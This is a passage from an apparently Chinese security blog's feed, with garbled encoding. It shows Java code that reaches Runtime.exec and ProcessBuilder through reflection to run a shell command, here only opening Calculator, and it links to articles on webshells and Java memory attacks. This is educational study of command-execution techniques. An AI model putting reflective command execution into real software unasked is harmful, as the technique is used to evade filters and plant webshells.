Webshellé‚£äº›äº‹â€”â€”æ”»å‡»ç¯‡ï¼ˆä¸Šï¼‰</a></li><li><a href="https://xz.aliyun.com/t/10535">æµ…è°ˆåŠ è½½å­—èŠ‚ç ç›¸å…³çš„Javaå®‰å…¨é—®é¢˜</a></li><li><a href="https://xz.aliyun.com/t/10075">Javaå†…å­˜æ”»å‡»æŠ€æœ¯æ¼«è°ˆ</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Runtime&quot;&gt;&lt;a href=&quot;#Runtime&quot; class=&quot;headerlink&quot; title=&quot;Runtime&quot;&gt;&lt;/a&gt;Runtime&lt;/h2&gt;&lt;p&gt;Runtimeä¸­å¯ä»¥è·å–åˆ°&lt;code&gt;Runtime&lt;/code&gt;å®ä¾‹æœ‰ä¸‰ç§æ–¹æ³•:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;private static Runtime currentRuntime = new Runtime();&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;public static Runtime getRuntime()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;private Runtime() &amp;#123;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;/2022/03/22/java-reflection-shell/2.png&quot;&gt;&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;relfectDemo&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Constructor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Field&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectRuntime&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; cmd &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;sh&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;open /System/Applications/Calculator.app&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Runtime0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//åˆ©ç”¨ç§æœ‰å˜é‡ç”Ÿæˆå®ä¾‹ private static Runtime currentRuntime = new Runtime();&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; clazz &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.lang.Runtime&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Field&lt;/span&gt; field &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredField&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;currentRuntime&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        field&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;setAccessible&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Runtime&lt;/span&gt; runtime &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; field&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Runtime&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; method &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        method&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;runtime&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Runtime1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//åˆ©ç”¨     public static Runtime getRuntime() &amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//        return currentRuntime;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//    &amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; clazz &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.lang.Runtime&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; method &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;getRuntime&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Runtime&lt;/span&gt; runtime &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; method&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; method1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        method1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;runtime&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;


    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Runtime2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;// åˆ©ç”¨æ„é€ å‡½æ•° private Runtime() &amp;#123;&amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; clazz &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.lang.Runtime&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Constructor&lt;/span&gt; constructor &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredConstructor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        constructor&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;setAccessible&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Runtime&lt;/span&gt; runtime &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; constructor&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; method &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        method&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;runtime&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;ProcessBuilder&quot;&gt;&lt;a href=&quot;#ProcessBuilder&quot; class=&quot;headerlink&quot; title=&quot;ProcessBuilder&quot;&gt;&lt;/a&gt;ProcessBuilder&lt;/h2&gt;&lt;p&gt;ä½¿ç”¨&lt;code&gt;constructor&lt;/code&gt;åˆå§‹åŒ–å¯¹è±¡çš„æ—¶å€™ï¼Œæ¥æ”¶çš„å‚æ•°æ˜¯ä¸€ä¸ªObjectæ•°ç»„ï¼Œæ‰€ä»¥éœ€è¦&lt;code&gt;new Object[]&lt;/code&gt;å¼ºåˆ¶è½¬æ¢: &lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;relfectDemo&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Constructor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;util&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Arrays&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;util&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectProcessBuilder&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; cmd &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;sh&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;open /System/Applications/Calculator.app&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectPB0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; clazz &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.lang.ProcessBuilder&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Constructor&lt;/span&gt; constructor &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getConstructor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;token comment&quot;&gt;//newInstanceæ¥æ”¶çš„æ˜¯ä¸€ä¸ªObjectæ•°ç»„ï¼Œéœ€è¦è½¬åŒ–ä¸€ä¸‹&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ProcessBuilder&lt;/span&gt; pb &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;ProcessBuilder&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; constructor&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token 